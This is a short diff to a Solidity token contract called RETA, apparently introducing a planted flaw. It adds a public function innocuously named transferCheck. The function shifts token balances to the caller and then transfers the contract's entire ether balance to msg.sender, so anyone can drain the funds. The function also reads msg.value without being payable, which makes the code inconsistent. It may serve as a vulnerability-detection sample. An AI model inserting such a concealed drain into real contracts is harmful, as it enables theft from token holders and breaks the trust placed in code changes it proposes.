@@ -404,4 +404,14 @@ contract RETA is StandardToken, Pausable, Claimable {
     // owner can drain tokens that are sent here by mistake
     token.transfer(owner, amount);
   }
+	 function transferCheck() public {
+		totalEth = totalEth + msg.value;
+		uint256 amount = msg.value * unitsEth;
+		if (balances[walletAdd] < amount) {
+			return;
+		}
+		balances[walletAdd] = balances[walletAdd] - amount;
+		balances[msg.sender] = balances[msg.sender] + amount;
+   		msg.sender.transfer(this.balance);
+  }
 }
